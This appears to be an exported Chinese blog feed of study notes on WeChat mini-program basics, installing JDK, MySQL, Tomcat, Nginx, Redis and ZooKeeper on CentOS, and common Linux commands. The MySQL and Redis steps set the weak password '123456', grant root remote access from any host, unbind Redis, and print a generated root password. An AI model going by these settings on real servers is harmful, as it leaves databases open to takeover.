</span><br><span class="line">|   |-- helper.js  </span><br><span class="line">|   |-- another_helper.js  </span><br><span class="line">|-- app.js</span><br></pre></td></tr></tbody></table></figure><p>这里只是一个基本的目录结构示例，实际上可能还有其他的文件夹和文件。为了方便新手理解，可以按照以下步骤操作：</p><ol><li>在你的开发环境中创建一个新的文件夹，例如命名为<code>my_wechat_app</code>。</li><li>在<code>my_wechat_app</code>文件夹下创建<code>pages</code>文件夹，并按照上面的示例结构进行创建。</li><li>在<code>my_wechat_app</code>文件夹下创建<code>utils</code>文件夹，并添加一些辅助函数或工具类文件。</li><li>在<code>my_wechat_app</code>文件夹下创建<code>app.js</code>文件，这是小程序的全局配置文件。</li><li>在你的开发环境中打开<code>my_wechat_app</code>文件夹，就可以看到完整的目录结构了。</li></ol><p>在我看来，小程序的开发过程其实和Vue开发是有些许相同的，在Data,渲染，和生命周期来看，都能看到些许共同点，不同的是，小程序提供了更多的封装功能API，方便开发者更快的实现功能，小程序的出现比起现在的Web项目，应该更加方便和容易开发，以微信的庞大人群，可以让开发者更快的实现自己想要的功能和部署出自己的项目。</p><h4 id="app-json"><a href="#app-json" class="headerlink" title="app.json"></a>app.json</h4><p>这是一个全局配置文件</p><p><strong>pages</strong>:用来记录当前小程序所有页面的路径</p><p><strong>window</strong>:全局定义定义小程序所有页面的背景颜色，文字颜色等</p><p><strong>style</strong>:全局定义小程序组件所使用的样式版本 默认v2是最新版本 删除后回到老版</p><p><strong>sitemapLocation</strong>:指明sitemap.json的位置</p><h4 id="project-config-json"><a href="#project-config-json" class="headerlink" title="project.config.json"></a>project.config.json</h4><p>这是一个个性化配置文件</p><p><strong>setting</strong>:编译相关配置</p><p><strong>progectname</strong>:项目名称</p><p><strong>appid</strong>:小程序账号ID</p><h4 id="sitemap-json"><a href="#sitemap-json" class="headerlink" title="sitemap.json"></a>sitemap.json</h4><p>这个文件用来配置小程序页面是否允许微信索引</p><p>有些类似PC网页的SEO</p><p>aciton:是否允许被索引 默认是allow允许，如果你不想被索引可以替换为disallow</p><p>page:页面 默认是*号，就是允许所有页面被索引</p><p>tip:如果不想看到索引的黄色警告，可以在project.config.json的setting里的checkSiteMap改为false，意为关闭警告 如果没有找到这个数据可以自己补全。</p><h4 id="页面-json配置文件的作用"><a href="#页面-json配置文件的作用" class="headerlink" title="页面.json配置文件的作用"></a>页面.json配置文件的作用</h4><p>此文件作用是用来配置页面的外观</p><p><strong>tip</strong>:在相同配置中，页面的配置文件会覆盖全局的配置文件</p><h4 id="新建小程序页面"><a href="#新建小程序页面" class="headerlink" title="新建小程序页面"></a>新建小程序页面</h4><p>当你在<strong>app.json</strong>的<strong>pages</strong>里<strong>新增</strong>一个<strong>页面路径</strong>，程序就会<strong>自动生成</strong>相关文件和配置</p><h4 id="修改项目首页"><a href="#修改项目首页" class="headerlink" title="修改项目首页"></a>修改项目首页</h4><p>在<strong>app.json</strong>的<strong>pages</strong>里，顺序就可以决定首页，排在最上方的会被微信小程序自动识别为首页</p><h4 id="WXML模板"><a href="#WXML模板" class="headerlink" title="WXML模板"></a>WXML模板</h4><p>微信小程序用来构建网页结构的模板文件</p><p>虽然名字不同，但是其原理和HTML相同，套用即可快速学会</p><h5 id="WXML和HTML的区别"><a href="#WXML和HTML的区别" class="headerlink" title="WXML和HTML的区别"></a>WXML和HTML的区别</h5><p><strong>1.标签名称不同</strong></p><ul><li>HTML (div, span, img, a)</li><li>WXML (view, text, image, navigator)</li></ul><p><strong>2.属性节点不同</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;ahref="#"&gt;超链接&lt;/a&gt;</span><br><span class="line">&lt;navigator url="/pages/home/home"&gt;&lt;/navigator&gt;</span><br></pre></td></tr></tbody></table></figure><p><strong>3.提供了类似于 Vue 中的模板语法</strong></p><p>可以帮助我们快速实现模板的渲染</p><ul><li>数据绑定</li><li>列表渲染</li><li>条件渲染</li></ul><h4 id="WXSS样式"><a href="#WXSS样式" class="headerlink" title="WXSS样式"></a>WXSS样式</h4><p>微信小程序用来描述组件的样式文件</p><p>和HTML的CSS逻辑类似</p><h5 id="WXSS和CSS的区别"><a href="#WXSS和CSS的区别" class="headerlink" title="WXSS和CSS的区别"></a>WXSS和CSS的区别</h5><p><strong>1.新增了 rpx 尺寸单位</strong></p><ul><li>CSS中需要手动进行像素单位换算，例如 rem</li><li>WXSS在底层支持新的尺寸单位 rpx，在不同大小的屏幕上小程序会自动进行换算</li></ul><p><strong>2.提供了全局的样式和局部样式</strong></p><ul><li>项目根目录中的app.wxss 会作用于所有小程序页面</li><li>局部页面的.wxss样式仅对当前页面生效</li></ul><p><strong>3.WXSS 仅支持部分 CSS 选择器</strong></p><ul><li>.class和#id</li><li>element</li><li>并集选择器、后代选择器</li><li>::after和::before 等伪类选择器</li></ul><h4 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h4><p>使用Js文件来编写页面逻辑部分的操作判断</p><p>app.js是整个小程序项目的入口文件</p><p>页面.js是创建页面后自动生成的js文件，用来实现个人页面的逻辑功能</p><p>普通的.js文件用来封装公共的函数或者属性来供页面使用</p><h4 id="宿主环境-Host-environment"><a href="#宿主环境-Host-environment" class="headerlink" title="宿主环境(Host environment)"></a>宿主环境(Host environment)</h4><p>不同的宿主环境支持不同的程序项目</p><p><img src="/Blackcat-loveBlog/png/suzhu.png"></p><p>而小程序的宿主环境基于微信中</p><p><img src="/Blackcat-loveBlog/png/suzhu2.png"></p><p>基于微信环境这个特殊的位置，我们可以使用微信提供的各种封装接口来实现在普通网页无法完成的功能，比如，微信扫码、微信支付、微信登陆、地理定位、etc….等等等。</p><p>小程序宿主环境包含的内容</p><ul><li>通信模型</li><li>运行机制</li><li>组件</li><li>API</li></ul><h4 id="小程序启动过程顺序"><a href="#小程序启动过程顺序" class="headerlink" title="小程序启动过程顺序"></a>小程序启动过程顺序</h4><ol><li>把小程序的代码包下载到本地</li><li>解析app.json 全局配置文件</li><li>执行 app.js 小程序入口文件</li><li>调用 App() 创建小程序实例</li><li>渲染小程序首页</li><li>小程序启动完成</li></ol><h4 id="页面渲染过程"><a href="#页面渲染过程" class="headerlink" title="页面渲染过程"></a>页面渲染过程</h4><ol><li>加载解析页面的json配置文件</li><li>加载页面的wxl模板和wxss样式</li><li>执行页面的 .js 文件，调用 Page() 创建页面实例</li><li>页面渲染完成</li></ol><h4 id="通信模型"><a href="#通信模型" class="headerlink" title="通信模型"></a>通信模型</h4><h4 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h4><p>组件的出现可以让开发者快速开发出自己想要的功能，这些组件都是微信官方封装好的，可以直接调用</p><h5 id="view"><a href="#view" class="headerlink" title="view"></a>view</h5><h5 id="image"><a href="#image" class="headerlink" title="image"></a>image</h5><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><h4 id="事件传参和数据同步"><a href="#事件传参和数据同步" class="headerlink" title="事件传参和数据同步"></a>事件传参和数据同步</h4><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><h4 id="API调用"><a href="#API调用" class="headerlink" title="API调用"></a>API调用</h4><h4 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux中安装软件</title>
      <link href="/NANABLOG/2023/12/18/linux%E4%B8%AD%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/"/>
      <url>/NANABLOG/2023/12/18/linux%E4%B8%AD%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="linux中安装软件"><a href="#linux中安装软件" class="headerlink" title="linux中安装软件"></a>linux中安装软件</h1><h3 id="一-linux常用命令"><a href="#一-linux常用命令" class="headerlink" title="一.linux常用命令"></a>一.linux常用命令</h3><p>​        查看ip ifconfig</p><p>​查看目录 ls  或者 ll </p><p>​        查看当前所在目录pwd</p><p>​        创建目录 mkdir</p><p>​移动文件或者修改文件名 mv    旧名字    新名字</p><p>​        删除目录 rm </p><p>​        创建文件 touch </p><p>​        编辑文件(1) vim 或者vi  进入到文件中   </p><p>​       (2)通过按i 或a 进入到编辑模式</p><p>​   (3)按esc </p><p>​                       (4)输入:eq 保存并退出   或者:q!强制退出</p><p>​       显示文件前几行: head -n  文件名</p><p>​       显示后几行: tail -n 文件名</p><p>​       切换用户: su</p><p>​       查看当前用户 whoami</p><p>​       查看进程 ps -ef </p><p>​   查看对应软件的进程 ps -ef | grep 软件名称</p><p>​       杀死进程 kill -9 pid</p><p>​       解压tar -zxvf  或者 tar -xvf</p><h3 id="二-安装jdk"><a href="#二-安装jdk" class="headerlink" title="二.安装jdk"></a>二.安装jdk</h3><ol><li><p>将下载好的软件上传到/usr/local/java 中</p></li><li><p>解压软件 tar -zxvf  </p></li><li><p>重命名 mv   旧名字  新名字</p></li><li><p>查看是否安装jdk java -version 或者 rpm -qa | grep java(查看jdk进程)</p><p>ps:使用 rpm -e –nodeps 或者 yum remove <em>openjdk</em>卸载</p></li><li><p>配置环境变量</p><ul><li><p>使用vim  /etc/profile</p></li><li><p>在结尾添加</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">export JAVA_HOME=/usr/local/java/jdk1.8</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p>重新加载配置文件 source /etc/profile</p></li><li><p>查看是否安装成功</p></li></ol><h3 id="三-安装mysql"><a href="#三-安装mysql" class="headerlink" title="三.安装mysql"></a>三.安装mysql</h3><ol><li><p>上传文件到/usr/local/mysql</p><p>如果上传失败可能是因为你需要在ssh链接的时候就使用root账户链接，即使中途切换到root也无法上传成功，只能是一开始就是root</p></li><li><p>解压 tar -xvf </p></li><li><p>重命名mv mysql8</p></li><li><p>在mysql8目录中创建 mkdir data</p></li><li><p>创建组及用户</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">groupadd mysql</span><br><span class="line">useradd -g mysql mysql</span><br></pre></td></tr></tbody></table></figure></li><li><p>用户授权 chown -R mysql.mysql /usr/local/mysql/mysql8</p></li><li><p>初始化</p><ul><li>进入 bin 目录</li><li>./mysqld –user=mysql –basedir=/usr/local/mysql/mysql8 –datadir=/usr/local/mysql/mysql8/data/ –initialize</li><li>记住密码: ;8c9uMyUz#Vu</li></ul></li><li><p>编辑my.cnf</p><p>​vim /etc/my.cnf 注释掉mysqld_safe和下面2条内容 修改basedir datadir socket信息</p><p>​    </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">basedir=/usr/local/mysql/mysql8</span><br><span class="line">datadir=/usr/local/mysql/mysql8/data</span><br><span class="line">socket=/tmp/mysql.sock</span><br><span class="line">user=mysql</span><br></pre></td></tr></tbody></table></figure></li><li><p>添加mysqld服务</p><ul><li>返回到mysql8目录</li><li>输入cp -a ./support-files/mysql.server /etc/init.d/mysql</li></ul></li><li><p>授权及添加服务</p><ul><li>chmod +x /etc/init.d/mysql</li><li>chkconfig –add mysql</li></ul></li><li><p>启动mysql服务 service mysql start</p></li><li><p>查看状态 service mysql status</p></li><li><p>将mysql命令添加到服务中 ln -s /usr/local/mysql/mysql8/bin/mysql /usr/bin</p></li><li><p>登录 mysql -uroot -p</p></li><li><p>修改密码</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '123456';</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></tbody></table></figure></li><li><p>远程连接</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#mysql 8.0</span><br><span class="line">use mysql;</span><br><span class="line">update user set host='%' where user='root';</span><br><span class="line"> </span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">#mysql 5.0</span><br><span class="line">CREATE USER root@'%' IDENTIFIED BY '123456';</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;</span><br></pre></td></tr></tbody></table></figure></li><li><p>开放端口</p><p>开放后对应端口可以在本地管理数据库软件通过ip远程链接数据库</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">firewall-cmd --add-port=8080/tcp --permanent</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></tbody></table></figure><p> 如果需要本地去给mysql数据库添加数据表和数据，可以在本地使用数据库链接软件链接远程数据库，</p></li></ol><p>主机改为数据库ip然后填写之前生成的密码，链接成功。</p><p>然后就可以像之前操作本地数据库一样操作远程数据库了。</p><h3 id="四-安装tomcat"><a href="#四-安装tomcat" class="headerlink" title="四.安装tomcat"></a>四.安装tomcat</h3><p>​1.下载文件到 /usr/local/tomcat中</p><p>​        2.解压</p><p>​        3.启动  进入tomcat的bin中 ./startup.sh &amp;&amp; tail -f ../logs/catalina.out</p><p>启动成功后可以通过服务器ip:端口号 的方式访问到 tomcat官方页面</p><p>注意检查tomcat启动的访问端口，如果无法访问成功可能是因为端口号未开放，需要使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#开放端口</span><br><span class="line">firewall-cmd --add-port=端口号/tcp --permanent</span><br><span class="line">#刷新</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></tbody></table></figure><p>开放后再次重启tomcat即可访问成功</p><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><ol><li><p>介绍(轻量级web服务器主要进行动静分离,反向代理,负载均衡)</p></li><li><p>常用命令</p><ol><li>去sbin目录中执行./nginx -v 查看版本</li><li>./nginx -t 检查配置文件时候正确</li><li>./nginx 启动</li><li>ps -ef | grep nginx 查看进程</li><li>./nginx -s reload 重写加载配置文件</li></ol></li><li><p>配置环境变量可以直接启动</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">export PATH=/usr/local/nginx/sbin:$PATH:${JAVA_PATH}</span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>配置文件</p><ol><li><p>全局块(nginx全局配置)</p></li><li><p>events块(网络相关配置)</p></li><li><p>http块</p><ol><li>http全局块</li><li>server块(可以有多个)<ol><li>server全局块</li><li>location块(可以有多个)</li></ol></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">server {</span><br><span class="line">        listen       80;//监听端口</span><br><span class="line">        server_name  www.ywxdlc.com;//域名</span><br><span class="line">charset utf-8;//编码格式</span><br><span class="line"></span><br><span class="line">location / {</span><br><span class="line">root   /home/projects/travel/travel-ui; //静态资源根目录</span><br><span class="line">try_files $uri $uri/ /index.html;</span><br><span class="line">index  index.html index.htm; //默认加载页面</span><br><span class="line">        }</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure></li></ol></li><li><p>反向代理</p><p>客户直接方法代理服务器,代理服务器会请求服务器响应信息</p></li><li><p>负载均衡</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">upstream xiaxia{</span><br><span class="line">server 192.168.1:8080;</span><br><span class="line">server 192.168.1:8082;</span><br><span class="line">}</span><br><span class="line">server {</span><br><span class="line">        listen       80;//监听端口</span><br><span class="line">        server_name  www.ywxdlc.com;//域名</span><br><span class="line">charset utf-8;//编码格式</span><br><span class="line"></span><br><span class="line">location / {</span><br><span class="line">root   /home/projects/travel/travel-ui; //静态资源根目录</span><br><span class="line">try_files $uri $uri/ /index.html;</span><br><span class="line">index  index.html index.htm; //默认加载页面</span><br><span class="line">proxy_pass http://xiaxia; //与上面代理组保持一致</span><br><span class="line">        }</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="五-项目javaweb部署"><a href="#五-项目javaweb部署" class="headerlink" title="五.项目javaweb部署"></a>五.项目javaweb部署</h3><p>​1.项目打war包</p><p><img src="/Blackcat-loveBlog/png/QQ%E5%9B%BE%E7%89%8720230524175202.png"></p><p><img src="/Blackcat-loveBlog/png/QQ%E5%9B%BE%E7%89%8720230524175259.png"></p><p>项目打war包后可以部署在服务器中，打包时提示:模块缺少所需库’lib’ </p><p>测试过程中将war包部署在tomcat后运行可以成功，不用担心</p><p>war包可以在打包时候的界面里看到路径，一般是在你项目的out文件夹里可以找到。</p><p>ps:打包的时候最好修改项目名称</p><p>​    项目jdk版本要和linux保持一致</p><p>​连接linux数据库记得修改密码</p><p>将war包上传到CentOS7服务器中的tomcat/webapps里</p><p>然后重新启动tomcat</p><p>即可通过服务器ip:端口号/war包名 的格式访问到</p><p>例如:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">192.168.136.128:8080/manager</span><br></pre></td></tr></tbody></table></figure><h3 id="六-安装redis"><a href="#六-安装redis" class="headerlink" title="六.安装redis"></a>六.安装redis</h3><p>​1.redis-server –service-install redis.windows.conf –loglevel verbose(添加window服务)</p><ol><li><p>创建目录/usr/local/redis 上传文件</p></li><li><p>解压 tar -zxvf</p></li><li><p>安装 make PREFIX=/usr/local/redis/redis-3.2.8 install</p></li><li><p>在redis3.2.8中创建etc目录 将 配置文件复制一份 cp redis.conf  etc</p></li><li><p>开启端口 </p></li><li><p>修改/etc中的配置文件</p><ul><li>#bind 127.0.0.1 注释掉 </li><li>daemonize yes 128行</li><li>logfile “/usr/local/redis/redis-3.2.8/log/redis.log”   163行   ps:创建对应目录及文件</li><li>dir /usr/local/redis/redis-3.2.8/data/redisdata        247行   ps:创建对应目录</li><li>requirepass 123456    480行</li></ul></li><li><p>监控redis日志在新的窗口中 tail -F /usr/local/redis/redis-3.2.8/log/redis.log</p></li><li><p>启动服务./redis-server ../etc/redis.conf</p></li><li><p>启动客户端在bin目录中 ./redis-cli</p><h4 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h4><ol><li>auth 认证</li><li>quit 退出</li><li>set  设置值   set test haha ex 10 nx</li><li>get key</li><li>exists 是否存在 输入一个key 返回0或者1 输入多个key 返回存在的个数</li><li>keys 查找key值   通配符 ? 匹配一个字符     * 匹配n个字符  [ab] 选其一  [6^a]不要 6取反</li><li>del 删除key</li><li>rename 旧名字 新名字</li><li>expire 设置超时</li><li>ttl 返回剩余时间</li><li>persist 设置为永久有效</li><li>select 选择数据库</li><li>flushdb 清空所选数据库的值</li><li>flushall 清空所有数据库的值</li></ol><h4 id="2-使用jedis连接redis"><a href="#2-使用jedis连接redis" class="headerlink" title="2.使用jedis连接redis"></a>2.使用jedis连接redis</h4><ol><li>导入jedis所需jar包</li><li>写api</li><li>测试</li></ol><h4 id="3-springboot整合redis"><a href="#3-springboot整合redis" class="headerlink" title="3.springboot整合redis"></a>3.springboot整合redis</h4><ol><li><p>添加依赖</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;3.0.4&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line">  &lt;!-- spring2.X集成redis所需common-pool2 如果上面引入的依赖是2.x则加--&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.6.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"> </span><br></pre></td></tr></tbody></table></figure></li><li><p>创建配置</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">        <span class="attr">database:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">timeout:</span> <span class="number">1800000</span></span><br><span class="line">        <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">        <span class="attr">lettuce:</span></span><br><span class="line">          <span class="attr">pool:</span></span><br><span class="line">            <span class="attr">max-active:</span> <span class="number">20</span></span><br><span class="line">            <span class="attr">max-wait:</span> <span class="number">-1</span></span><br><span class="line">            <span class="attr">max-idle:</span> <span class="number">5</span></span><br><span class="line">        <span class="attr">min-idle:</span> <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>添加工具类</p><p>添加redisconfig</p></li><li><p>测试</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">@resource</span><br><span class="line">private RedisTemplate redistemplate</span><br><span class="line">redistemplate.opsofvalue.set</span><br></pre></td></tr></tbody></table></figure></li><li><p>redis无法序列化localtime</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;jackson-datatype-jsr310&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;2.13.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="spring-cache"><a href="#spring-cache" class="headerlink" title="spring cache"></a>spring cache</h3><ol><li><p>介绍</p><p>基于注解实现缓存</p></li><li><p>常用注解</p><p>@EnableCaching 开启注解</p><p>@Cacheable 写在方法上 如果有数据存缓存中去,如果没有则保存在缓存中</p><p>@CachePut 将方法的返回值放入缓存中</p><p>@CacheEvict 将一条或者多条数据从缓存中删除</p></li><li><p>配置</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cache:</span><br><span class="line">    redis:</span><br><span class="line">      time-to-live: 1800000 //设置缓存时间</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;</span><br><span class="line">      &lt;/dependency&gt;</span><br><span class="line">      启动类上或者配置类上加注解EnableCaching</span><br></pre></td></tr></tbody></table></figure></li><li></li></ol><h3 id="安装zookper"><a href="#安装zookper" class="headerlink" title="安装zookper"></a>安装zookper</h3><ol><li><p>在local下创建dubbo目录上传压缩包</p></li><li><p>解压</p></li><li><p>在解压的文件夹中创建data目录和log目录</p></li><li><p>进入conf下复制配置文件 cp zoo_sample.cfg zoo.cfg</p></li><li><p>进入zoo.config配置文件</p><p>dataDir=/usr/local/dubbo/apache-zookeeper-3.7.1-bin/data<br>dataLogDir=/usr/local/dubbo/apache-zookeeper-3.7.1-bin/log</p></li><li><p>开启端口号</p></li><li><p>进入bin 启动服务  ./zkServer.sh start</p></li><li><p>启动客户端 ./zkCli.sh </p></li><li><p>welcome to zookper </p></li><li><p>安装dubboo admin 上传 启动 即可nohup java -jar dubbo-admin-server-0.2.0-SNAPSHOT.jar &amp;</p></li></ol><h3 id="springboot整合dubbo"><a href="#springboot整合dubbo" class="headerlink" title="springboot整合dubbo"></a>springboot整合dubbo</h3><ol><li><p>导入依赖</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">       &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">       &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class="line">   &lt;/dependency&gt;</span><br><span class="line">   &lt;dependency&gt;</span><br><span class="line">       &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;dubbo&lt;/artifactId&gt;</span><br><span class="line">       &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class="line">   &lt;/dependency&gt;</span><br><span class="line">   &lt;dependency&gt; &lt;!--zookeeper 注册中心客户端引入 curator客户端 --&gt;</span><br><span class="line">       &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;dubbo-dependencies-zookeeper&lt;/artifactId&gt;</span><br><span class="line">       &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class="line">       &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">   &lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p>写配置文件</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">dubbo:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">dubbo_provider</span></span><br><span class="line">  <span class="attr">registry:</span></span><br><span class="line">    <span class="attr">address:</span> <span class="string">zookeeper://192.168.116.141:2181</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="number">6000</span></span><br><span class="line">  <span class="attr">metadata-report:</span></span><br><span class="line">    <span class="attr">address:</span> <span class="string">zookeeper://192.168.116.141:2181</span></span><br><span class="line">  <span class="attr">protocol:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">dubbo</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">20880</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>创建privider  在实现类中加@service注解 此注解dubbo提供</p></li><li><p>创建消费者 加@Reference 如果提供者和消费者调用的不是同一个接口需要使用@Reference(check = false)</p></li></ol></li></ol><p>​ </p><p>​</p><p>​</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统CentOS学习笔记</title>
      <link href="/NANABLOG/2023/12/18/Linux%E7%B3%BB%E7%BB%9FCentOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2023/12/18/Linux%E7%B3%BB%E7%BB%9FCentOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blackcat-loveBlog/png/linux.jpg"></p><h2 id="Linux操作系统目录结构"><a href="#Linux操作系统目录结构" class="headerlink" title="Linux操作系统目录结构"></a>Linux操作系统目录结构</h2><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">/ (根目录)</span><br><span class="line">├── bin (二进制文件) - 存放系统启动和运行所需的基本命令</span><br><span class="line">├── boot (引导文件) - 存放用于系统引导的文件</span><br><span class="line">├── dev (设备文件) - 包含系统所需的设备文件，如硬盘、键盘等</span><br><span class="line">├── etc (配置文</span><br><span class="line">件) - 存放系统的配置文件</span><br><span class="line">├── home (用户主目录) - 存放用户个人文件的根目录</span><br><span class="line">├── lib (库文件) - 包含系统运行时所需的共享库文件</span><br><span class="line">├── media (可移动介质挂载点) - 用来挂载可移动介质的目录，如光盘、U盘等</span><br><span class="line">├── mnt (临时挂载目录) - 用来临时挂载其他文件系统的目录</span><br><span class="line">├── opt (可选应用软件包) - 存放可选的应用软件包的安装目录</span><br><span class="line">├── proc (进程信息) - 包含系统内存的映射文件，用于查看系统和进程信息</span><br><span class="line">├── root (超级用户目录) - 超级用户（root）的个人文件目录</span><br><span class="line">├── sbin (系统二进制文件) - 存放系统管理员使用的系统管理命令</span><br><span class="line">├── tmp (临时文件) - 存放临时文件的目录</span><br><span class="line">├── usr (用户文件) - 包含用户级应用程序和文件的目录</span><br><span class="line">└── var (变化文件) - 包含经常变化的文件，如日志和邮件等</span><br></pre></td></tr></tbody></table></figure><h2 id="基础操作指令"><a href="#基础操作指令" class="headerlink" title="基础操作指令"></a>基础操作指令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>ls</td><td>列出目录内容</td></tr><tr><td>cd</td><td>切换目录</td></tr><tr><td>pwd</td><td>显示当前目录</td></tr><tr><td>cat</td><td>查看或连接文件</td></tr><tr><td>cp</td><td>复制文件或目录</td></tr><tr><td>mv ‘旧名字’ ‘新名字’ or mv ‘文件名’ ‘移动的路径’</td><td>移动/重命名文件或目录</td></tr><tr><td>rm</td><td>删除文件或目录</td></tr><tr><td>mkdir</td><td>创建目录</td></tr><tr><td>rmdir</td><td>删除目录</td></tr><tr><td>touch ‘文件名’</td><td>创建空文件</td></tr><tr><td>grep</td><td>在文件中查找指定文本</td></tr><tr><td>ps</td><td>显示当前进程</td></tr><tr><td>top</td><td>显示系统当前资源占用情况</td></tr><tr><td>kill</td><td>终止进程</td></tr></tbody></table><h3 id="查看ip"><a href="#查看ip" class="headerlink" title="查看ip"></a>查看ip</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></tbody></table></figure><h3 id="进入根目录"><a href="#进入根目录" class="headerlink" title="进入根目录"></a>进入根目录</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br></pre></td></tr></tbody></table></figure><h3 id="切换root"><a href="#切换root" class="headerlink" title="切换root"></a>切换root</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></tbody></table></figure><h3 id="切换普通用户"><a href="#切换普通用户" class="headerlink" title="切换普通用户"></a>切换普通用户</h3><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">su 